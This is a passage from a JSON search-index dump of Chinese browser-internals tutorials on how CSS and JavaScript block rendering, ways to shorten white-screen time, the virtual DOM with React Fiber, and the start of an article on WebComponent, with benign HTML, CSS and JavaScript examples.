class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">href</span>=<span class=\"string\">\"theme.css\"</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>geekbang com<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>这两段代码分别由 CSS 文件和 HTML 文件构成，我们来分析下打开这段 HTML 文件时的渲染流水线，你可以先参考下面这张渲染流水线示意图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663a24980ea9cb1403c0c32e.png\" alt=\"含有CSS的页面渲染流水线\"></p>\n<p>下面我们结合上图来分析这个页面文件的渲染流水线。</p>\n<p>首先是发起主页面的请求，这个发起请求方可能是渲染进程，也有可能是浏览器进程，发起的请求被送到网络进程中去执行。网络进程接收到返回的 HTML 数据之后，将其发送给渲染进程，渲染进程会解析 HTML 数据并构建 DOM。这里你需要特别注意下，请求 HTML 数据和构建 DOM 中间有一段空闲时间，这个空闲时间有可能成为页面渲染的瓶颈。</p>\n<p>上一篇文章中我们提到过，当渲染进程接收 HTML 文件字节流时，会先开启一个<strong>预解析线程</strong>，如果遇到 JavaScript 文件或者 CSS 文件，那么预解析线程会提前下载这些数据。对于上面的代码，预解析线程会解析出来一个外部的 theme.css 文件，并发起 theme.css 的下载。这里也有一个空闲时间需要你注意一下，就是在 DOM 构建结束之后、theme.css 文件还未下载完成的这段时间内，渲染流水线无事可做，因为下一步是合成布局树，而合成布局树需要 CSSOM 和 DOM，所以这里需要等待 CSS 加载结束并解析成 CSSOM。</p>\n<p><strong>那渲染流水线为什么需要 CSSOM 呢？</strong></p>\n<p>和 HTML 一样，渲染引擎也是无法直接理解 CSS 文件内容的，所以需要将其解析成渲染引擎能够理解的结构，这个结构就是 CSSOM。和 DOM 一样，CSSOM 也具有两个作用，<strong>第一个是提供给 JavaScript 操作样式表的能力，第二个是为布局树的合成提供基础的样式信息</strong>。这个 CSSOM 体现在 DOM 中就是 <code>document.styleSheets</code>。具体结构你可以去查阅相关资料，这里我就不过多介绍了，你知道 CSSOM 的两个作用是怎样的就行了。</p>\n<p>有了 DOM 和 CSSOM，接下来就可以合成布局树了，我们在前面《<a href=\"/browser/protocol/http-navigation.html\">渲染流程</a>》这篇文章中讲解过布局树的构造过程，这里咱们再简单回顾下。等 DOM 和 CSSOM 都构建好之后，渲染引擎就会构造布局树。布局树的结构基本上就是复制 DOM 树的结构，不同之处在于 DOM 树中那些不需要显示的元素会被过滤掉，如 display:none 属性的元素、head 标签、script 标签等。复制好基本的布局树结构之后，渲染引擎会为对应的 DOM 元素选择对应的样式信息，这个过程就是<strong>样式计算</strong>。样式计算完成之后，渲染引擎还需要计算布局树中每个元素对应的几何位置，这个过程就是<strong>计算布局</strong>。通过样式计算和计算布局就完成了最终布局树的构建。再之后，就该进行后续的绘制操作了。</p>\n<p>这就是在渲染过程中涉及到 CSS 的一些主要流程。</p>\n<p>了解了这些之后，我们再来看看稍微复杂一点的场景，还是看下面这段 HTML 代码：</p>\n<figure class=\"highlight css\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">//theme<span class=\"selector-class\">.css</span></span><br><span class=\"line\"><span class=\"selector-tag\">div</span>{ </span><br><span class=\"line\">    <span class=\"attribute\">color</span> : coral;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>:black</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">href</span>=<span class=\"string\">\"theme.css\"</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>geekbang com<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'time.geekbang.org'</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>geekbang com<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>这段代码是我在开头代码的基础之上做了一点小修改，在 body 标签内部加了一个简单的 JavaScript 。有了 JavaScript ，渲染流水线就有点不一样了，可以参考下面这张渲染流水线图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663a27010ea9cb1403c514e2.png\" alt=\"含有JavaScript和CSS的页面渲染流水线\"></p>\n<p>那我们就结合这张图来分析含有外部 CSS 文件和 JavaScript 代码的页面渲染流水线，<a href=\"/browser/pages/DOMTree.html\">上一篇文章</a>中我们提到过在解析 DOM 的过程中，如果遇到了 JavaScript 脚本，那么需要先暂停 DOM 解析去执行 JavaScript ，因为 JavaScript 有可能会修改当前状态下的 DOM。</p>\n<p>不过在执行 JavaScript 脚本之前，如果页面中包含了外部 CSS 文件的引用，或者通过 style 标签内置了 CSS 内容，那么渲染引擎还需要将这些内容转换为 CSSOM，因为 JavaScript 有修改 CSSOM 的能力，所以在执行 JavaScript 之前，还需要依赖 CSSOM。也就是说 CSS 在部分情况下也会阻塞 DOM 的生成。</p>\n<p>我们再来看看更加复杂一点的情况，如果在 body 中被包含的是 JavaScript 外部引用文件，Demo 代码如下所示：</p>\n<figure class=\"highlight css\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">//theme<span class=\"selector-class\">.css</span></span><br><span class=\"line\"><span class=\"selector-tag\">div</span>{ </span><br><span class=\"line\">    <span class=\"attribute\">color</span> : coral;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>:black</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//foo.js</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'time.geekbang.org'</span>)</span><br></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">href</span>=<span class=\"string\">\"theme.css\"</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>geekbang com<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">'foo.js'</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>geekbang com<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>从上面代码可以看出来，HTML 文件中包含了 CSS 的外部引用和 JavaScript 外部文件，那它们的渲染流水线是怎样的呢？可参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663a27d30ea9cb1403c62cca.png\" alt=\"含有JavaScript文件和CSS文件页面的渲染流水线\"></p>\n<p>从图中可以看出来，在接收到 HTML 数据之后的预解析过程中，HTML 预解析器识别出来了有 CSS 文件和 JavaScript 文件需要下载，然后就同时发起这两个文件的下载请求，需要注意的是，这两个文件的下载过程是重叠的，所以下载时间按照最久的那个文件来算。</p>\n<p>后面的流水线就和前面是一样的了，不管 CSS 文件和 JavaScript 文件谁先到达，都要先等到 CSS 文件下载完成并生成 CSSOM，然后再执行 JavaScript 脚本，最后再继续构建 DOM，构建布局树，绘制页面。</p>\n<h2 id=\"影响页面展示的因素以及优化策略\"><a href=\"#影响页面展示的因素以及优化策略\" class=\"headerlink\" title=\"影响页面展示的因素以及优化策略\"></a>影响页面展示的因素以及优化策略</h2><p>前面我们为什么要花这么多文字来分析渲染流水线呢？主要原因就是<strong>渲染流水线影响到了首次页面展示的速度，而首次页面展示的速度又直接影响到了用户体验</strong>，所以我们分析渲染流水线的目的就是为了找出一些影响到首屏展示的因素，然后再基于这些因素做一些针对性的调整。</p>\n<p>那么接下来我们就来看看从发起 URL 请求开始，到首次显示页面的内容，在视觉上经历的三个阶段。</p>\n<ul>\n<li>第一个阶段，等请求发出去之后，到提交数据阶段，这时页面展示出来的还是之前页面的内容。关于提交数据你可以参考前面《<a href=\"/browser/protocol/http-navigation.html\">导航流程：从输入 URL 到页面展示，这中间发生了什么？</a>》这篇文章。</li>\n<li>第二个阶段，提交数据之后渲染进程会创建一个空白页面，我们通常把这段时间称为<strong>解析白屏</strong>，并等待 CSS 文件和 JavaScript 文件的加载完成，生成 CSSOM 和 DOM，然后合成布局树，最后还要经过一系列的步骤准备首次渲染。</li>\n<li>第三个阶段，等首次渲染完成之后，就开始进入完整页面的生成阶段了，然后页面会一点点被绘制出来。</li>\n</ul>\n<p>影响第一个阶段的因素主要是网络或者是服务器处理这块儿，前面文章中我们已经讲过了，这里我们就不再继续分析了。至于第三个阶段，我们会在后续文章中分析，所以这里也不做介绍了。</p>\n<p>那么第二个阶段，也就是解析白屏，我们可以通过一些优化手段来减少这个阶段。为了缩短白屏时间，我们来挨个分析这个阶段的主要任务，包括了解析 HTML、下载 CSS、下载 JavaScript、生成 CSSOM、执行 JavaScript、生成布局树、绘制页面一系列操作。</p>\n<p>通常情况下的瓶颈主要体现在<strong>下载 CSS 文件、下载 JavaScript 文件和执行 JavaScript</strong>。</p>\n<p>所以要想缩短白屏时长，可以有以下策略：</p>\n<ul>\n<li>通过内联 JavaScript、内联 CSS 来移除这两种类型的文件下载，这样获取到 HTML 文件之后就可以直接开始渲染流程了。</li>\n<li>但并不是所有的场合都适合内联，那么还可以尽量减少文件大小，比如通过 webpack 等工具移除一些不必要的注释，并压缩 JavaScript 文件。</li>\n<li>对于大的 CSS 文件，可以通过媒体查询属性，将其拆分为多个不同用途的 CSS 文件，这样只有在特定的场景下才会加载特定的 CSS 文件。</li>\n</ul>\n<p>通过以上策略就能缩短白屏展示的时长了，不过在实际项目中，总是存在各种各样的情况，这些策略并不能随心所欲地去引用，所以还需要结合实际情况来调整最佳方案。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天就介绍到这里，下面我来总结下今天的内容。</p>\n<p>我们首先介绍了 CSS 在渲染流水线中的位置，以及 CSS 是如何影响到渲染流程的；接下来我们通过渲染流水线分析了从发出请求到页面首次绘制的三个阶段；最后重点介绍了第二个白屏阶段以及优化该阶段的一些策略。</p>\n<p>通过今天的内容我们可以知道虽然 JavaScript 和 CSS 给我们带来了极大的便利，不过也对页面的渲染带来了很多的限制，所以我们要关注资源加载速度，需要小心翼翼地处理各种资源之间的关联关系。</p>\n<h2 id=\"课外作业\"><a href=\"#课外作业\" class=\"headerlink\" title=\"课外作业\"></a>课外作业</h2><p>今天留给你的思考题是：当你横屏方向拿着一个手机时，打开一个页面，观察下面几种资源的加载方式，你认为哪几种会阻塞页面渲染？为什么？</p>\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">1:<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"foo.js\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">2:<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">defer</span> <span class=\"attr\">src</span>=<span class=\"string\">\"foo.js\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">3:<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">sync</span> <span class=\"attr\">src</span>=<span class=\"string\">\"foo.js\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">4:<span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/css\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"foo.css\"</span> /&gt;</span></span><br><span class=\"line\">5:<span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/css\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"foo.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"screen\"</span>/&gt;</span></span><br><span class=\"line\">6:<span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/css\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"foo.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"print\"</span> /&gt;</span></span><br><span class=\"line\">7:<span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/css\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"foo.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"orientation:landscape\"</span> /&gt;</span></span><br><span class=\"line\">8:<span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/css\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"foo.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"orientation:portrait\"</span> /&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>欢迎在留言区与我分享你的想法，也欢迎你在留言区记录你的思考过程。感谢阅读，如果你觉得这篇文章对你有帮助的话，也欢迎把它分享给更多的朋友。</p>\n"},{"title":"虚拟 DOM ：虚拟 DOM 和实际的 DOM 有何不同？","url":"/browser/pages/VirtualDOM.html","content":"<p>虚拟 DOM 是最近非常火的技术，两大著名前端框架 React 和 Vue 都使用了虚拟 DOM ，所以我觉得非常有必要结合浏览器的工作机制对虚拟 DOM 进行一次分析。当然了，React 和 Vue 框架本身所蕴含的知识点非常多，而且也不是我们专栏的重点，所以在这里我们还是把重心聚焦在虚拟 DOM 上。</p>\n<p>在本文我们会先聊聊 DOM 的一些缺陷，然后在此基础上介绍虚拟 DOM 是如何解决这些缺陷的，最后再站在双缓存和 MVC 的视角来聊聊虚拟 DOM 。理解了这些会让你对目前的前端框架有一个更加底层的认识，这也有助于你更好地理解这些前端框架。</p>\n<h2 id=\"DOM-的缺陷\"><a href=\"#DOM-的缺陷\" class=\"headerlink\" title=\"DOM 的缺陷\"></a>DOM 的缺陷</h2><p>通过前面一系列文章的学习，你对 DOM 的生成过程应该已经有了比较深刻的理解，并且也知道了通过 JavaScript 操纵 DOM 是会影响到整个渲染流水线的。另外，DOM 还提供了一组 JavaScript 接口用来遍历或者修改节点，这套接口包含了 <code>getElementById</code>、<code>removeChild</code>、<code>appendChild</code> 等方法。</p>\n<p>比如，我们可以调用 <code>document.body.appendChild(node)</code> 往 body 节点上添加一个元素，调用该 API 之后会引发一系列的连锁反应。首先渲染引擎会将 node 节点添加到 body 节点之上，然后触发样式计算、布局、绘制、栅格化、合成等任务，我们把这一过程称为<strong>重排</strong>。除了重排之外，还有可能引起<strong>重绘</strong>或者<strong>合成</strong>操作，形象地理解就是 “<strong>牵一发而动全身</strong>”。另外，对于 DOM 的不当操作还有可能引发强制同步布局和布局抖动的问题，这些操作都会大大降低渲染效率。因此，对于 DOM 的操作我们时刻都需要非常小心谨慎。</p>\n<p>当然，对于简单的页面来说，其 DOM 结构还是比较简单的，所以以上这些操作 DOM 的问题并不会对用户体验产生太多影响。但是对于一些复杂的页面或者目前使用非常多的单页应用来说，其 DOM 结构是非常复杂的，而且还需要不断地去修改 DOM 树，每次操作 DOM 渲染引擎都需要进行重排、重绘或者合成等操作，因为 DOM 结构复杂，所生成的页面结构也会很复杂，对于这些复杂的页面，执行一次重排或者重绘操作都是非常耗时的，这就给我们带来了真正的性能问题。</p>\n<p>所以我们需要有一种方式来减少 JavaScript 对 DOM 的操作，这时候虚拟 DOM 就上场了。</p>\n<h2 id=\"什么是虚拟DOM\"><a href=\"#什么是虚拟DOM\" class=\"headerlink\" title=\"什么是虚拟DOM\"></a>什么是虚拟 DOM</h2><p>在谈论什么是虚拟 DOM 之前，我们先来看看虚拟 DOM 到底要解决哪些事情。</p>\n<ul>\n<li>将页面改变的内容应用到虚拟 DOM 上，而不是直接应用到 DOM 上。</li>\n<li>变化被应用到虚拟 DOM 上时，虚拟 DOM 并不急着去渲染页面，而仅仅是调整虚拟 DOM 的内部状态，这样操作虚拟 DOM 的代价就变得非常轻了。</li>\n<li>在虚拟 DOM 收集到足够的改变时，再把这些变化一次性应用到真实的 DOM 上。</li>\n</ul>\n<p>基于以上三点，我们再来看看什么是虚拟 DOM。为了直观理解，你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663b519d0ea9cb14037dd8b3.png\" alt=\"虚拟DOM执行流程\"></p>\n<p>该图是我结合 React 流程画的一张虚拟 DOM 执行流程图，下面我们就结合这张图来分析下虚拟 DOM 到底怎么运行的。</p>\n<ul>\n<li><strong>创建阶段</strong>。首先依据 JSX 和基础数据创建出来虚拟 DOM，它反映了真实的 DOM 树的结构。然后由虚拟 DOM 树创建出真实 DOM 树，真实的 DOM 树生成完后，再触发渲染流水线往屏幕输出页面。</li>\n<li><strong>更新阶段</strong>。如果数据发生了改变，那么就需要根据新的数据创建一个新的虚拟 DOM 树；然后 React 比较两个树，找出变化的地方，并把变化的地方一次性更新到真实的 DOM 树上；最后渲染引擎更新渲染流水线，并生成新的页面。</li>\n</ul>\n<p>既然聊到虚拟 DOM 的更新，那我们就不得不聊聊最新的 <strong>React Fiber 更新机制</strong>。通过上图我们知道，当有数据更新时，React 会生成一个新的虚拟 DOM，然后拿新的虚拟 DOM 和之前的虚拟 DOM 进行比较，这个过程会找出变化的节点，然后再将变化的节点应用到 DOM 上。</p>\n<p>这里我们重点关注下比较过程，最开始的时候，比较两个虚拟 DOM 的过程是在一个递归函数里执行的，其<strong>核心算法是 reconciliation</strong>。通常情况下，这个比较过程执行得很快，不过当虚拟 DOM 比较复杂的时候，执行比较函数就有可能占据主线程比较久的时间，这样就会导致其他任务的等待，造成页面卡顿。为了解决这个问题，React 团队重写了 reconciliation 算法，新的算法称为 Fiber reconciler，之前老的算法称为 Stack reconciler。</p>\n<p>在前面《<a href=\"/browser/pageEventLoop/AsyncAwait.html\">async/await：使用同步的方式去写异步代码</a>》那篇文章中我们介绍了协程，其实协程的另外一个称呼就是 Fiber，所以在这里我们可以把 Fiber 和协程关联起来，那么所谓的 Fiber reconciler 相信你也很清楚了，就是在执行算法的过程中出让主线程，这样就解决了 Stack reconciler 函数占用时间过久的问题。至于具体的实现过程在这里我就不详细分析了，如果感兴趣的话，你可以自行查阅相关资料进行学习。</p>\n<p>了解完虚拟 DOM 的大致执行流程，你应该也就知道为何需要虚拟 DOM 了。不过以上都从单纯的技术视角来分析虚拟 DOM 的，那接下来我们再从双缓存和 MVC 模型这两个视角来聊聊虚拟 DOM。</p>\n<h3 id=\"1-双缓存\"><a href=\"#1-双缓存\" class=\"headerlink\" title=\"1. 双缓存\"></a>1. 双缓存</h3><p>在开发游戏或者处理其他图像的过程中，屏幕从前缓冲区读取数据然后显示。但是很多图形操作都很复杂且需要大量的运算，比如一幅完整的画面，可能需要计算多次才能完成，如果每次计算完一部分图像，就将其写入缓冲区，那么就会造成一个后果，那就是在显示一个稍微复杂点的图像的过程中，你看到的页面效果可能是一部分一部分地显示出来，因此在刷新页面的过程中，会让用户感受到界面的闪烁。</p>\n<p>而使用双缓存，可以让你先将计算的中间结果存放在另一个缓冲区中，等全部的计算结束，该缓冲区已经存储了完整的图形之后，再将该缓冲区的图形数据一次性复制到显示缓冲区，这样就使得整个图像的输出非常稳定。</p>\n<p>在这里，你可以把虚拟 DOM 看成是 DOM 的一个 buffer，和图形显示一样，它会在完成一次完整的操作之后，再把结果应用到 DOM 上，这样就能减少一些不必要的更新，同时还能保证 DOM 的稳定输出。</p>\n<h3 id=\"2-MVC模式\"><a href=\"#2-MVC模式\" class=\"headerlink\" title=\"2. MVC模式\"></a>2. MVC 模式</h3><p>到这里我们了解了虚拟 DOM 是一种类似双缓存的实现。不过如果站在技术角度来理解虚拟缓存，依然不能全面理解其含义。那么接下来我们再来看看虚拟 DOM 在 MVC 模式中所扮演的角色。</p>\n<p>在各大设计模式当中，MVC 是一个非常重要且应用广泛的模式，因为它能将数据和视图进行分离，在涉及到一些复杂的项目时，能够大大减轻项目的耦合度，使得程序易于维护。</p>\n<p>关于 MVC 的基础结构，你可以先参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663b52570ea9cb14037ef36c.png\" alt=\"MVC基础结构\"></p>\n<p>通过上图你可以发现，MVC 的整体结构比较简单，由模型、视图和控制器组成，其<strong>核心思想就是将数据和视图分离</strong>，也就是说视图和模型之间是不允许直接通信的，它们之间的通信都是通过控制器来完成的。通常情况下的通信路径是视图发生了改变，然后通知控制器，控制器再根据情况判断是否需要更新模型数据。当然还可以根据不同的通信路径和控制器不同的实现方式，基于 MVC 又能衍生出很多其他的模式，如 MVP、MVVM 等，不过万变不离其宗，它们的基础骨架都是基于 MVC 而来。</p>\n<p>所以在分析基于 React 或者 Vue 这些前端框架时，我们需要先重点把握大的 MVC 骨架结构，然后再重点查看通信方式和控制器的具体实现方式，这样我们就能从架构的视角来理解这些前端框架了。比如在分析 React 项目时，我们可以把 React 的部分看成是一个 MVC 中的视图，在项目中结合 Redux 就可以构建一个 MVC 的模型结构，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663b52830ea9cb14037f3c4d.png\" alt=\"基于React和Redux构建MVC模型\"></p>\n<p>在该图中，我们可以把虚拟 DOM 看成是 MVC 的视图部分，其控制器和模型都是由 Redux 提供的。其具体实现过程如下：</p>\n<ul>\n<li>图中的控制器是用来监控 DOM 的变化，一旦 DOM 发生变化，控制器便会通知模型，让其更新数据；</li>\n<li>模型数据更新好之后，控制器会通知视图，告诉它模型的数据发生了变化；</li>\n<li>视图接收到更新消息之后，会根据模型所提供的数据来生成新的虚拟 DOM；</li>\n<li>新的虚拟 DOM 生成好之后，就需要与之前的虚拟 DOM 进行比较，找出变化的节点；</li>\n<li>比较出变化的节点之后，React 将变化的虚拟节点应用到 DOM 上，这样就会触发 DOM 节点的更新；</li>\n<li>DOM 节点的变化又会触发后续一系列渲染流水线的变化，从而实现页面的更新。<br>在实际工程项目中，你需要学会分析出这各个模块，并梳理出它们之间的通信关系，这样对于任何框架你都能轻松上手了。</li>\n</ul>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天就介绍到这里，下面我来总结下本文的主要内容。</p>\n<p>首先我们分析了直接操作 DOM 会触发渲染流水线的一系列反应，如果对 DOM 操作不当的话甚至还会触发强制同步布局和布局抖动的问题，这也是我们在操作 DOM 时需要非常小心谨慎的原因。</p>\n<p>在此分析的基础上，我们介绍了虚拟 DOM 是怎么解决直接操作 DOM 所带来的问题以及 React Fiber 更新机制。</p>\n<p>要聊前端框架，就绕不开设计模式，所以接下来我们又从双缓存和 MVC 角度分析了虚拟 DOM。双缓存是一种经典的思路，应用在很多场合，能解决页面无效刷新和闪屏的问题，虚拟 DOM 就是双缓存思想的一种体现。而基于 MVC 的设计思想也广泛地渗透到各种场合，并且基于 MVC 又衍生出了很多其他模式（如 MVP、MVVM 等），不过万变不离其宗，它们的基础骨架都是基于 MVC 而来。站在 MVC 视角来理解虚拟 DOM 能让你看到更为 “广阔的世界”。</p>\n"},{"title":"WebComponent：像搭积木一样构建 Web 应用","url":"/browser/pages/WebComponent.html","content":"<p>在上一篇文章中我们从技术演变的角度介绍了 PWA，这是一套集合了多种技术的理念，让浏览器渐进式适应设备端。今天我们要站在开发者和项目角度来聊聊 WebComponent，同样它也是一套技术的组合，能提供给开发者组件化开发的能力。</p>\n<p>那什么是组件化呢？</p>\n<p>其实组件化并没有一个明确的定义，不过这里我们可以使用 10 个字来形容什么是组件化，那就是：<strong>对内高内聚，对外低耦合</strong>。对内各个元素彼此紧密结合、相互依赖，对外和其他组件的联系最少且接口简单。</p>\n<p>可以说，程序员对组件化开发有着天生的需求，因为一个稍微复杂点的项目，就涉及到多人协作开发的问题，每个人负责的组件需要尽可能独立完成自己的功能，其组件的内部状态不能影响到别人的组件，在需要和其他组件交互的地方得提前协商好接口。通过组件化可以降低整个系统的耦合度，同时也降低程序员之间沟通复杂度，让系统变得更加易于维护。</p>\n<p>使用组件化能带来很多优势，所以很多语言天生就对组件化提供了很好的支持，比如 C/C++ 就可以很好地将功能封装成模块，无论是业务逻辑，还是基础功能，抑或是 UI，都能很好地将其组合在一起，实现组件内部的高度内聚、组件之间的低耦合。</p>\n<p>大部分语言都能实现组件化，归根结底在于编程语言特性，大多数语言都有自己的函数级作用域、块级作用域和类，可以将内部的状态数据隐藏在作用域之下或者对象的内部，这样外部就无法访问了，然后通过约定好的接口和外部进行通信。</p>\n<p>JavaScript 虽然有不少缺点，但是作为一门编程语言，它也能很好地实现组件化，毕竟有自己的函数级作用域和块级作用域，所以封装内部状态数据并提供接口给外部都是没有问题的。</p>\n<p>既然 JavaScript 可以很好地实现组件化，那么我们所谈论的 WebComponent 到底又是什么呢？</p>\n<h2 id=\"阻碍前端组件化的因素\"><a href=\"#阻碍前端组件化的因素\" class=\"headerlink\" title=\"阻碍前端组件化的因素\"></a>阻碍前端组件化的因素</h2><p>在前端虽然 HTML、CSS 和 JavaScript 是强大的开发语言，但是在大型项目中维护起来会比较困难，如果在页面中嵌入第三方内容时，还需要确保第三方的内容样式不会影响到当前内容，同样也要确保当前的 DOM 不会影响到第三方的内容。</p>\n<p>所以要聊 WebComponent，得先看看 HTML 和 CSS 是如何阻碍前端组件化的，这里我们就通过下面这样一个简单的例子来分析下：</p>\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\"><span class=\"selector-tag\">p</span> {</span></span><br><span class=\"line\"><span class=\"language-css\">      <span class=\"attribute\">background-color</span>: brown;</span></span><br><span class=\"line\"><span class=\"language-css\">      <span class=\"attribute\">color</span>: cornsilk</span></span><br><span class=\"line\"><span class=\"language-css\">   }</span></span><br><span class=\"line\"><span class=\"language-css\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>time.geekbang.org<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\"><span class=\"selector-tag\">p</span> 